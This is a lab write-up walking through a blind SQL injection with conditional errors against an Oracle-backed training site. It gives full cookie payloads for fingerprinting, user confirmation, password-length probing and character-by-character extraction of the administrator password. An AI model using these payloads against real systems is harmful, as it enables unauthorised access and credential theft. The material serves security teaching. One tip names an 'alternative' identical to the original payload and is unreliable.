# SQL Injection - Lab #12: Blind SQL Injection with Conditional Errors

**YouTube Tutorial:** [SQL Injection - Lab #12 Blind SQL injection with conditional errors](https://youtu.be/_7w-KEP_K5w)

---

## 1. What is Conditional-Error Blind SQLi?

### Core Concept

This lab is a **blind SQL injection** where:
- The application **never returns** query results in the HTTP response.
- It does **not** expose verbose database error messages (no CAST-based visibility).
- There is **no** conditional welcome-back message to boolean-test.

However, the app **does** return an **HTTP 500 Internal Server Error** when a SQL syntax error occurs, and an **HTTP 200 OK** when the query is syntactically valid. This thin error/normal response difference is all you need.

**Conditional-Error Blind SQL Injection** exploits this by injecting a `CASE WHEN` expression that causes a **divide-by-zero error** only when a specified condition is TRUE:

- **Condition is TRUE** → `TO_CHAR(1/0)` executes → **divide-by-zero error** → **HTTP 500**
- **Condition is FALSE** → `ELSE ''` (empty string) is returned → **no error** → **HTTP 200**

By systematically testing TRUE/FALSE statements about the database contents (e.g., "Is the first character of the password `'a'`?"), an attacker can extract the full administrator password character-by-character using **HTTP status codes as the oracle**.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

- **Vulnerable Parameter:** The `TrackingId` cookie value sent in HTTP requests.
- **Blind SQL Injection Mechanism:** Query results are suppressed, but **SQL syntax errors** are reflected as HTTP 500 responses.
- **Database:** **Oracle** (confirmed by `FROM dual` requirement, `TO_CHAR(1/0)` syntax, `ROWNUM`, `SUBSTR()`).
- **Conditional Error Trigger:** `TO_CHAR(1/0)` produces a divide-by-zero error when evaluated. Wrapped in `CASE WHEN condition THEN TO_CHAR(1/0) ELSE '' END`, the error fires conditionally.
- **Oracle Quirk:** All `SELECT` statements in Oracle **must specify a table** — `FROM dual` (a dummy table) is used for subqueries that don't query a real table.

### Root Cause & Impact

- **Root Cause:** Insecure concatenation of cookie values into backend SQL queries without parameterized input filtering.
- **Error Handling:** The app catches SQL exceptions but returns them as `HTTP 500` rather than suppressing them — the error/no-error binary is the only side-channel needed.
- **End Goals:**
  - Use conditional error triggers to brute-force the `administrator` password character-by-character.
  - Log in as `administrator` to complete the lab.

---

## 3. Attack Methods & Techniques

### Method Details

- **Phase 1 (Confirm SQLi via Syntax Errors):** Append `'` → HTTP 500 (broken query). Append `''` → HTTP 200 (valid string). The error-or-not response confirms injection.
- **Phase 2 (Database Fingerprinting):** `'||(SELECT '' FROM dual)||'` → HTTP 200 confirms **Oracle**.
- **Phase 3 (Confirm `users` Table):** `'||(SELECT '' FROM users WHERE ROWNUM=1)||'` → HTTP 200 proves the table exists.
- **Phase 4 (Test Conditional Error Logic):** `CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END` → HTTP 500 (TRUE). `CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END` → HTTP 200 (FALSE).
- **Phase 5 (Confirm `administrator` User):** Same pattern with `WHERE username='administrator'` → HTTP 500 confirms the user exists.
- **Phase 6 (Password Length):** `LENGTH(password)>N` with conditional error → iterate N until the error disappears at N=20, confirming length = 20.
- **Phase 7 (Character-by-Character Extraction):** `SUBSTR(password, pos, 1)='char'` with Burp Intruder (Cluster Bomb: position index + character) → only the matching character produces HTTP 500.
- **Phase 8 (Login):** Use extracted password to log in as `administrator`.

### Server Behavior

- **Syntactically invalid SQL (`'`):** **HTTP 500 Internal Server Error**
- **Syntactically valid SQL (`''`):** **HTTP 200 OK** (normal response)
- **Condition TRUE (`TO_CHAR(1/0)` evaluated):** **HTTP 500** (divide-by-zero error)
- **Condition FALSE (`''` returned):** **HTTP 200 OK** (no error)

---

## 4. Step-by-Step Walkthrough

### Step 1: Intercept the Request

1. Visit the front page of the shop and intercept the request in Burp Proxy.
2. Send the `GET /` request (containing `TrackingId`) to **Repeater**.

```http
GET / HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Cookie: TrackingId=xyz; session=[SESSION-COOKIE]
```

### Step 2: Confirm SQL Injection via Syntax Errors

1. Append a single quote:

```http
Cookie: TrackingId=xyz'
```

- **Result:** **HTTP 500** — the unclosed string breaks the SQL syntax.

2. Append two single quotes (a valid escaped quote):

```http
Cookie: TrackingId=xyz''
```

- **Result:** **HTTP 200** — the syntax is valid again.

This confirms that SQL syntax errors have a detectable effect on the response.

### Step 3: Identify the Database Type (Oracle)

1. Test a subquery with no table name:

```http
Cookie: TrackingId=xyz'||(SELECT '')||'
```

- **Result:** **HTTP 500** — Oracle requires a `FROM` clause in all `SELECT` statements.

2. Add `FROM dual` (Oracle's dummy table):

```http
Cookie: TrackingId=xyz'||(SELECT '' FROM dual)||'
```

- **Result:** **HTTP 200** — valid Oracle syntax. The database is **Oracle**.

### Step 4: Confirm the `users` Table Exists

1. Query the `users` table with `ROWNUM = 1` (Oracle's version of `LIMIT 1`):

```http
Cookie: TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

- **Result:** **HTTP 200** — the `users` table exists. (Without `ROWNUM = 1`, a multi-row result would break the concatenation.)

### Step 5: Test the Conditional Error Mechanism

1. Test a TRUE condition (`1=1`):

```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

- **Result:** **HTTP 500** — `1/0` is evaluated, causing a divide-by-zero error.

2. Test a FALSE condition (`1=2`):

```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

- **Result:** **HTTP 200** — the `ELSE ''` branch is taken, no error.

✅ Conditional error triggering is confirmed. HTTP 500 = TRUE, HTTP 200 = FALSE.

### Step 6: Confirm the `administrator` User Exists

```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- **Result:** **HTTP 500** — the `administrator` user exists, so `1=1` is TRUE and the error fires.

### Step 7: Determine Password Length

1. Use a series of `LENGTH(password)>N` tests. Start small:

```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- **Result:** **HTTP 500** (TRUE — password is longer than 1).

2. Continue incrementing N (2, 3, 4, ..., 20):

- `LENGTH(password)>19` → **HTTP 500** (TRUE)
- `LENGTH(password)>20` → **HTTP 200** (FALSE — password is NOT longer than 20)

3. **Result:** Password length is exactly **20 characters**.

### Step 8: Extract the Password Character by Character

1. Send the request to **Burp Intruder**.
2. Configure the cookie with payload positions for the character offset and the character value:

```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- **Payload position 1:** Numbers **1 to 20** (character positions).
- **Payload position 2:** Character set **a–z** and **0–9** (lowercase alphanumeric).

3. Use **Cluster Bomb** attack type.
4. Launch the attack.

**Reading the results:**

- HTTP **500** → The tested condition is TRUE → that character at that position matches.
- HTTP **200** → The tested condition is FALSE → no match.

Find the row with `Status: 500` for each position — the payload character in that row is the correct character.

#### Extracted Password Sequence

By recording the successful (HTTP 500) matches across all 20 positions, the administrator password is reconstructed as:

```
tdosf5caziu4dsh5ry1j
```

> ⚠️ **Note:** The password is randomly generated per lab instance — yours will differ. Extract it from your own Intruder results.

### Step 9: Log in as Administrator

1. Navigate to `/login` on the application.
2. Log in with:
- **Username:** `administrator`
- **Password:** `<extracted 20-character password>`

3. The lab displays **"Congratulations, you solved the lab!"**.

---

## 5. Pro-Tips & Common Pitfalls

- **The error is your oracle:** HTTP 500 means the condition is TRUE; HTTP 200 means FALSE. There's no other signal — don't look at the response body for data.
- **Oracle requires `FROM dual`:** Any `SELECT` that doesn't query a real table **must** include `FROM dual` in Oracle. Forgetting this gives a false HTTP 500.
- **`ROWNUM = 1` prevents multi-row breakage:** Querying `users` without restricting rows causes the subquery to return multiple rows, which breaks the concatenation and produces an error even when the query is valid. Always use `WHERE ROWNUM = 1` for existence checks.
- **`TO_CHAR(1/0)` is the error trigger:** The divide-by-zero inside `TO_CHAR()` is what causes the Oracle error. An alternative is `TO_CHAR(1/0)` — both work. The `TO_CHAR()` wrapper is necessary because Oracle's `CASE WHEN` expects consistent data types in both branches.
- **Character set is lowercase alphanumeric only:** The lab's password uses only `a–z` and `0–9`. Including uppercase letters or special characters in your Intruder payload list is unnecessary and wastes time.
- **Cluster Bomb is the right Intruder mode:** You need two payload positions (offset + character) that iterate independently — only Cluster Bomb handles this correctly. Sniper or Pitchfork will not work.
- **Burp Intruder Community is rate-limited:** The free edition is slow for 20 × 36 = 720 requests. A Python `requests` script with `response.status_code == 500` detection is significantly faster if you have the environment to run it.
- **The `||'` at the end preserves query syntax:** The injection closes the original string, appends the subquery, then opens a new string with `||'` so the backend's trailing SQL (e.g., `WHERE trackingId = '...'`) remains valid after the cookie value is substituted.
- **No Burp Pro required:** Everything runs through HTTP status codes in Repeater and Intruder — this lab is fully solvable with **Burp Suite Community Edition**.